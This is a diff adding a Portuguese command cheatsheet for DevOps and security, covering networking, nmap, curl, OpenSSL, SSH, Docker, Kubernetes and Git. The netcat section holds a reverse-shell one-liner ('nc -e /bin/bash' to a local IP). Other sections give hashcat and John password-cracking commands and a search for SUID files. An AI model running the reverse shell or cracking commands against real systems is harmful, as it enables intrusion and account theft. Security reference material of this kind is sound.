@@ -1,0 +1,371 @@
+---
+title: "Cheatsheet de Comandos"
+description: "Referência rápida de comandos essenciais para Segurança da Informação, DevOps, Redes, Docker, Kubernetes e mais."
+---
+
+# Cheatsheet de Comandos
+
+Referência rápida com os comandos mais utilizados no dia a dia de DevOps e Segurança da Informação.
+
+---
+
+## Redes
+
+### Ping
+
+| Comando | Descrição |
+|---|---|
+| `ping host` | Verifica conectividade com o host |
+| `ping -c 5 host` | Envia exatamente 5 pacotes |
+| `ping -i 0.2 host` | Intervalo de 0.2s entre pacotes |
+| `ping -s 1472 host` | Define o tamanho do pacote (bytes) |
+| `ping -t 64 host` | Define o TTL dos pacotes |
+| `ping6 host` | Ping via IPv6 |
+
+### Traceroute / Tracepath
+
+| Comando | Descrição |
+|---|---|
+| `traceroute host` | Rastreia a rota até o host |
+| `traceroute -n host` | Sem resolução de DNS (mais rápido) |
+| `traceroute -p 443 host` | Usa porta específica |
+| `tracepath host` | Alternativa sem privilégios root |
+| `mtr host` | Combinação de ping + traceroute em tempo real |
+
+### Netstat / SS
+
+| Comando | Descrição |
+|---|---|
+| `ss -tuln` | Lista portas abertas (TCP/UDP) |
+| `ss -tp` | Mostra processo associado a cada conexão |
+| `ss -s` | Resumo de estatísticas de sockets |
+| `netstat -rn` | Tabela de roteamento |
+| `netstat -i` | Estatísticas por interface |
+
+---
+
+## Netcat (nc)
+
+```bash
+# Servidor — ouvindo na porta 4444
+nc -lvnp 4444
+
+# Cliente — conectando ao servidor
+nc 192.168.1.10 4444
+
+# Transferência de arquivo (receptor)
+nc -lvnp 4444 > arquivo_recebido.txt
+
+# Transferência de arquivo (emissor)
+nc 192.168.1.10 4444 < arquivo.txt
+
+# Banner grabbing (fingerprint de serviço)
+nc -nv 192.168.1.10 80
+
+# Port scan simples
+nc -zv 192.168.1.10 20-80
+
+# Shell reversa (Linux)
+nc -e /bin/bash 192.168.1.10 4444
+
+# Relay UDP
+nc -u host 5005
+```
+
+---
+
+## Segurança da Informação
+
+### Nmap
+
+```bash
+# Scan básico de host
+nmap 192.168.1.10
+
+# Scan de rede inteira
+nmap 192.168.1.0/24
+
+# Detectar versões de serviços
+nmap -sV 192.168.1.10
+
+# Scan com scripts NSE padrão
+nmap -sC 192.168.1.10
+
+# Scan agressivo (versão + OS + scripts)
+nmap -A 192.168.1.10
+
+# Scan silencioso (SYN scan)
+nmap -sS 192.168.1.10
+
+# Scan UDP
+nmap -sU 192.168.1.10
+
+# Scan de portas específicas
+nmap -p 22,80,443,8080 192.168.1.10
+
+# Exportar resultado
+nmap -oN resultado.txt 192.168.1.10
+nmap -oX resultado.xml 192.168.1.10
+```
+
+### Curl
+
+```bash
+# GET simples
+curl https://exemplo.com
+
+# GET com headers detalhados
+curl -v https://exemplo.com
+
+# POST com JSON
+curl -X POST https://api.exemplo.com/endpoint \
+  -H "Content-Type: application/json" \
+  -d '{"chave": "valor"}'
+
+# Autenticação Bearer
+curl -H "Authorization: Bearer TOKEN" https://api.exemplo.com
+
+# Download de arquivo
+curl -O https://exemplo.com/arquivo.zip
+
+# Seguir redirecionamentos
+curl -L https://exemplo.com
+
+# Ignorar verificação SSL (apenas em testes)
+curl -k https://exemplo.com
+
+# Definir timeout
+curl --max-time 10 https://exemplo.com
+```
+
+### OpenSSL
+
+```bash
+# Inspecionar certificado SSL de um site
+openssl s_client -connect exemplo.com:443
+
+# Ver detalhes do certificado
+echo | openssl s_client -connect exemplo.com:443 2>/dev/null \
+  | openssl x509 -noout -text
+
+# Gerar chave privada RSA
+openssl genrsa -out chave.pem 4096
+
+# Gerar certificado autoassinado
+openssl req -x509 -newkey rsa:4096 \
+  -keyout chave.pem -out cert.pem \
+  -days 365 -nodes
+
+# Hash de arquivo
+openssl dgst -sha256 arquivo.txt
+
+# Codificar/decodificar base64
+openssl base64 -in arquivo.bin -out arquivo.b64
+openssl base64 -d -in arquivo.b64 -out arquivo.bin
+```
+
+### SSH
+
+```bash
+# Conexão básica
+ssh usuario@host
+
+# Porta customizada
+ssh -p 2222 usuario@host
+
+# Usar chave específica
+ssh -i ~/.ssh/minha_chave usuario@host
+
+# Túnel local (forward)
+ssh -L 8080:localhost:80 usuario@host
+
+# Túnel reverso
+ssh -R 9090:localhost:3000 usuario@host
+
+# Proxy SOCKS5
+ssh -D 1080 usuario@host
+
+# Executar comando remoto
+ssh usuario@host "ls -la /var/log"
+
+# Copiar arquivo remoto
+scp usuario@host:/caminho/arquivo.txt .
+
+# Sincronizar diretório
+rsync -avz usuario@host:/origem/ ./destino/
+```
+
+### Hashcat / John (senhas)
+
+```bash
+# John the Ripper — ataque de dicionário
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+# John — mostrar senhas encontradas
+john --show hash.txt
+
+# Hashcat — MD5 com dicionário
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Hashcat — SHA-256
+hashcat -m 1400 hash.txt wordlist.txt
+
+# Hashcat — ataque de força bruta (máscara)
+hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d
+
+# Identificar tipo de hash
+hash-identifier < hash.txt
+```
+
+---
+
+## Docker
+
+```bash
+# ─── Imagens ───────────────────────────────────────────────────────
+docker pull nginx:latest                    # Baixar imagem
+docker images                               # Listar imagens locais
+docker build -t minha-app:1.0 .             # Build de imagem
+docker rmi minha-app:1.0                    # Remover imagem
+docker image prune -a                       # Remover imagens não usadas
+
+# ─── Containers ────────────────────────────────────────────────────
+docker run -d -p 8080:80 --name web nginx   # Subir container
+docker ps                                   # Listar containers ativos
+docker ps -a                                # Listar todos os containers
+docker stop web                             # Parar container
+docker rm web                               # Remover container
+docker restart web                          # Reiniciar container
+
+# ─── Logs e Exec ───────────────────────────────────────────────────
+docker logs -f web                          # Seguir logs
+docker exec -it web bash                    # Shell interativo
+docker top web                              # Processos no container
+docker stats                                # Uso de recursos em tempo real
+
+# ─── Volumes e Redes ───────────────────────────────────────────────
+docker volume create meu-volume             # Criar volume
+docker volume ls                            # Listar volumes
+docker network create minha-rede            # Criar rede
+docker network ls                           # Listar redes
+docker inspect web                          # Detalhes do container
+
+# ─── Docker Compose ────────────────────────────────────────────────
+docker compose up -d                        # Subir em background
+docker compose down                         # Parar e remover
+docker compose logs -f                      # Logs de todos os serviços
+docker compose ps                           # Status dos serviços
+docker compose build                        # Rebuild das imagens
+```
+
+---
+
+## Kubernetes
+
+```bash
+# ─── Contexto e Namespace ──────────────────────────────────────────
+kubectl config get-contexts                 # Listar contextos
+kubectl config use-context meu-cluster      # Mudar contexto
+kubectl get ns                              # Listar namespaces
+kubectl config set-context --current \
+  --namespace=meu-ns                        # Definir namespace padrão
+
+# ─── Recursos Comuns ───────────────────────────────────────────────
+kubectl get pods                            # Listar pods
+kubectl get pods -A                         # Todos os namespaces
+kubectl get deploy                          # Listar deployments
+kubectl get svc                             # Listar services
+kubectl get ingress                         # Listar ingresses
+kubectl get nodes                           # Listar nós do cluster
+
+# ─── Detalhes e Debug ──────────────────────────────────────────────
+kubectl describe pod meu-pod                # Detalhes do pod
+kubectl logs meu-pod                        # Logs do pod
+kubectl logs -f meu-pod                     # Seguir logs
+kubectl logs meu-pod -c container           # Log de container específico
+kubectl exec -it meu-pod -- bash            # Shell no pod
+kubectl top pods                            # Uso de CPU/memória
+
+# ─── Aplicar e Deletar ─────────────────────────────────────────────
+kubectl apply -f manifesto.yaml             # Aplicar manifesto
+kubectl delete -f manifesto.yaml            # Deletar pelo manifesto
+kubectl delete pod meu-pod                  # Deletar pod
+kubectl rollout restart deploy minha-app    # Restart de deployment
+
+# ─── Scale e Rollout ───────────────────────────────────────────────
+kubectl scale deploy minha-app --replicas=3 # Escalar
+kubectl rollout status deploy minha-app     # Status do rollout
+kubectl rollout history deploy minha-app    # Histórico
+kubectl rollout undo deploy minha-app       # Rollback
+
+# ─── Port Forward ──────────────────────────────────────────────────
+kubectl port-forward pod/meu-pod 8080:80    # Redirecionar porta
+kubectl port-forward svc/meu-svc 8080:80    # Via service
+```
+
+---
+
+## DevOps / Utilitários
+
+### Git
+
+```bash
+git status                                  # Estado do repositório
+git log --oneline --graph --all             # Histórico visual
+git stash                                   # Guardar mudanças temporariamente
+git stash pop                               # Restaurar mudanças
+git cherry-pick <hash>                      # Aplicar commit específico
+git rebase -i HEAD~3                        # Rebase interativo (últimos 3)
+git bisect start                            # Encontrar commit com bug
+git diff HEAD~1 HEAD                        # Diff entre commits
+```
+
+### Processos e Sistema
+
+```bash
+# Gerenciar processos
+ps aux | grep nginx                         # Buscar processo
+kill -9 PID                                 # Forçar encerramento
+htop                                        # Monitor interativo
+lsof -i :8080                               # Processo usando porta 8080
+
+# Disco e memória
+df -h                                       # Uso de disco
+du -sh /var/log/*                           # Tamanho de diretórios
+free -h                                     # Uso de memória
+iostat -x 1                                 # I/O de disco
+
+# Firewall (UFW / iptables)
+ufw status verbose                          # Status do firewall
+ufw allow 443/tcp                           # Liberar porta
+ufw deny 23/tcp                             # Bloquear porta
+iptables -L -n -v                           # Listar regras iptables
+```
+
+### Grep e Busca
+
+```bash
+# Busca em arquivos
+grep -r "erro" /var/log/                    # Busca recursiva
+grep -i "error" app.log                     # Case insensitive
+grep -n "exception" app.log                 # Mostrar número da linha
+grep -A 3 -B 3 "panic" app.log             # 3 linhas de contexto
+
+# Find
+find /etc -name "*.conf" -type f            # Encontrar arquivos .conf
+find / -perm -4000 -type f 2>/dev/null      # Arquivos SUID (segurança)
+find /var/log -mtime -1                     # Modificados nas últimas 24h
+```
+
+---
+
+:::tip Dica
+Use `man <comando>` ou `<comando> --help` para ver a documentação completa de qualquer ferramenta.
+:::
+
+:::info Referências
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [Docker CLI Reference](https://docs.docker.com/engine/reference/commandline/cli/)
+- [kubectl Cheatsheet](https://kubernetes.io/docs/reference/kubectl/cheatsheet/)
+- [OpenSSL Cookbook](https://www.feistyduck.com/library/openssl-cookbook/)
+:::
